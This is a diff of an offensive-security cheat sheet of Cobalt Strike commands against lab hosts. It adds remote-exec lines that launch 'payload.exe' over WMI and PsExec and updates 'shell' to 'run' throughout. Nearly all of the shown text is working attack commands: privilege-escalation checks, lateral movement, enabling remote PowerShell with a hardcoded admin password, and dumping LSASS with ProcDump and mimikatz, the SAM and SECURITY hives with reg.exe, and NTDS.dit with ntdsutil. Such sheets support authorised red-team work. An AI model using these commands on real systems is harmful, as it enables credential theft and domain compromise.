@@ -46,7 +46,7 @@ powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
 
 ### [SharpUp](https://github.com/GhostPack/SharpUp) - .NET port of PowerUp
 ```
-# Run all checks automatically
+# Run all checks automatically - output to console
 execute-assembly C:\SharpUp.exe
 ```
 
@@ -121,6 +121,15 @@ jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER
 jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER
 ```
 
+Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi
+```
+# remote-exec using WMI
+remote-exec wmi ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
+
+# remote-exec using PsExec
+remote-exec psexec ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
+```
+
 Enable Powershell Remoting manually
 ```
 # Enable on local system with Admin privileges
@@ -128,7 +137,7 @@ powershell Enable-PSRemoting –Force
 
 # Enable on remote system 
 make_token AD\admin Password123! --> Token with Admin privileges on remote system is required
-shell psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force
+run psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force
 
 # Test remote access
 powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
@@ -272,7 +281,7 @@ execute-assembly C:\SharpWeb.exe all
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
 ```
 upload --> ProcDump.exe
-shell ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
+run ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
 ```
@@ -289,9 +298,9 @@ mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::lo
 
 ### SAM database dump using reg.exe (requries local Admin)
 ```
-shell reg.exe save HKLM\sam sam.save
-shell reg.exe save HKLM\security security.save
-shell reg.exe save HKLM\system system.save
+run reg.exe save HKLM\sam sam.save
+run reg.exe save HKLM\security security.save
+run reg.exe save HKLM\system system.save
 
 # Download SAM files then dump hahses offline using Secretsdump.py
 download sam.save
@@ -327,7 +336,7 @@ powerpick Copy-VSS -DestinationDir C:\temp
 ```
 NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
-shell activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
+run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
 ```
 ------------------------------------------------------------------------------------------
 ## Persistence
